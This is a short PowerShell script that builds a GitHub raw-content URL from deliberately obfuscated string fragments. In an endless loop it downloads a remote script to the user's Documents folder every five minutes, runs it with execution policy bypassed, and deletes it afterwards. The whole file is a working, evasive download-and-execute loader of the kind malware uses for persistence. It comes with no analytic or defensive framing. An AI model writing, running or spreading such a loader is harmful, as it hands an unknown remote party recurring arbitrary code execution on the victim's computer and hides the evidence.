$a1 = 'https://raw.github' + 'usercontent.com/'
$b1 = ('-0-v94837-09273w54-068245-0v9-62450-69u-b2-4059y-bn3-240w568-3450-862054986-2034p245iuyu6po7iu29345w/')[0..-1] -join ''
$c1 = ('main','/ps2','.ps1')[0,1,2] -join ''
$x1 = ('t','0','f')[0,1,2] -join ''
$x2 = ('m','4','n')[0,1,2] -join ''
$repoUrl = $a1 + $x1 + $x2 + $b1 + $c1
$filePath = "$env:USERPROFILE\Documents\ps2.ps1"
while ($true) {
    try {
        Invoke-WebRequest -Uri $repoUrl -OutFile $filePath
        powershell -ExecutionPolicy Bypass -File $filePath
        Remove-Item -Path $filePath -Force
    } catch {
        Write-Host "Error: $_"
    }
    Start-Sleep -Seconds 300
}
